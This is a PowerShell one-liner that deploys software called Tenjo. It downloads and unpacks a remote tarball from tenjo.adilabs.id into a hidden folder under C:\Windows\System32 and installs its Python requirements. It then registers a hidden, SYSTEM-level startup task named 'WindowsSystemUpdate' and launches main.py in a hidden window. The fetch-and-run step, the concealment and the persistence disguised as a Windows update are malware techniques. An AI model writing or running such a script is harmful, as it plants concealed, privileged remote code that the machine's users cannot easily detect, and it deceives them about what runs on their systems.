# Fixed PowerShell One-Liner with Proper Variable Assignment
# No special characters, clean syntax

powershell -Command "if (-NOT ([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]'Administrator')) { Write-Host 'Run as Administrator!' -ForegroundColor Red; Read-Host; exit }; Write-Host 'Installing Python and Deploying Tenjo...' -ForegroundColor Green; try { `$pv = python --version 2>&1; if (-not (`$pv -match 'Python 3\.(10|11|12)')) { throw 'Need Python' } } catch { Write-Host 'Installing Python 3.10...' -ForegroundColor Yellow; `$pythonInstaller = \"`$env:TEMP\python-installer.exe\"; Invoke-WebRequest -Uri 'https://www.python.org/ftp/python/3.10.11/python-3.10.11-amd64.exe' -OutFile `$pythonInstaller -UseBasicParsing; Start-Process -FilePath `$pythonInstaller -ArgumentList '/quiet', 'InstallAllUsers=1', 'PrependPath=1', 'Include_pip=1' -Wait; `$env:Path = [System.Environment]::GetEnvironmentVariable('Path', 'Machine') + ';' + [System.Environment]::GetEnvironmentVariable('Path', 'User'); Remove-Item `$pythonInstaller -Force -ErrorAction SilentlyContinue; Write-Host 'Python installed successfully' -ForegroundColor Green }; Get-Process -Name python -ErrorAction SilentlyContinue | Stop-Process -Force -ErrorAction SilentlyContinue; if (Test-Path 'C:\Windows\System32\.tenjo') { Remove-Item 'C:\Windows\System32\.tenjo' -Recurse -Force -ErrorAction SilentlyContinue }; New-Item -ItemType Directory -Path 'C:\Windows\System32\.tenjo' -Force | Out-Null; New-Item -ItemType Directory -Path 'C:\Windows\System32\.tenjo\src' -Force | Out-Null; try { Invoke-WebRequest -Uri 'https://tenjo.adilabs.id/downloads/installer_package.tar.gz' -OutFile \"`$env:TEMP\tenjo.tar.gz\" -UseBasicParsing; Write-Host 'Downloaded Tenjo installer' -ForegroundColor Green } catch { Write-Host 'Download failed' -ForegroundColor Red; Read-Host; exit }; if (Get-Command tar -ErrorAction SilentlyContinue) { tar -xzf \"`$env:TEMP\tenjo.tar.gz\" -C 'C:\Windows\System32\.tenjo\' } else { Write-Host 'Manual extraction needed - tar command not found' -ForegroundColor Yellow }; Set-Location 'C:\Windows\System32\.tenjo'; python -m pip install --upgrade pip --quiet; python -m pip install -r requirements.txt --quiet --trusted-host pypi.org --trusted-host files.pythonhosted.org; `$action = New-ScheduledTaskAction -Execute 'python' -Argument 'C:\Windows\System32\.tenjo\main.py' -WorkingDirectory 'C:\Windows\System32\.tenjo'; `$trigger = New-ScheduledTaskTrigger -AtStartup; `$settings = New-ScheduledTaskSettingsSet -Hidden -ExecutionTimeLimit ([TimeSpan]::Zero); `$principal = New-ScheduledTaskPrincipal -UserID 'SYSTEM' -LogonType ServiceAccount -RunLevel Highest; Register-ScheduledTask -TaskName 'WindowsSystemUpdate' -Action `$action -Trigger `$trigger -Settings `$settings -Principal `$principal -Force | Out-Null; Start-Process python 'C:\Windows\System32\.tenjo\main.py' -WorkingDirectory 'C:\Windows\System32\.tenjo' -WindowStyle Hidden; Remove-Item \"`$env:TEMP\tenjo.tar.gz\" -Force -ErrorAction SilentlyContinue; Write-Host 'Deployment completed! Check: https://tenjo.adilabs.id' -ForegroundColor Green"